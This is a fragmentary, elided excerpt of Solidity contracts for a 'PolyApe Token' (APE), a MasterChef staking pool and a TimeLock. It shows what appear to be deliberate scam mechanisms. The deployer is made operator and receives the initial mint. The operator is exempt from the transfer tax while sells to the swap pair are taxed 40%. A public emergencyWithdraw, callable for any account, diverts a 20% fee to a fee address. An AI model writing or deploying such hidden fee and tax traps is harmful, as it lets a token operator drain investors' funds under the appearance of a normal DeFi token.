...
contract APE is ERC20 {
     ...
     */
    constructor() public ERC20("PolyApe Token", "APE") {
        _operator = tx.origin;
        emit OperatorTransferred(address(0), _operator);
        _mint(tx.origin, 50000 *10 **18);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override{
        ...
        if (recipient == BURN_ADDRESS || transferTaxRate == 0 || tx.origin == _operator) {
            ...
            uint256 taxAmount = recipient == tokenSwapPair ? amount.mul(4000).div(10000) : amount.mul(transferTaxRate).div(10000);
...
contract MasterChef is Ownable, ReentrancyGuard {
    ...
    function emergencyWithdraw(uint256 _pid, address _account) public nonReentrant {
        PoolInfo storage pool = poolInfo[_pid];
        ...
        uint Fee = amount.mul(1000).div(5000); // fail safe fee calculator
        pool.lpToken.safeTransfer(address(feeAddress), Fee);
        pool.lpToken.safeTransfer(address(_account), amount - Fee);
...
contract TimeLock {
    ...
    constructor() public {
        ...
        asset = address(new MasterChef(18600000, .1 ether));
    }
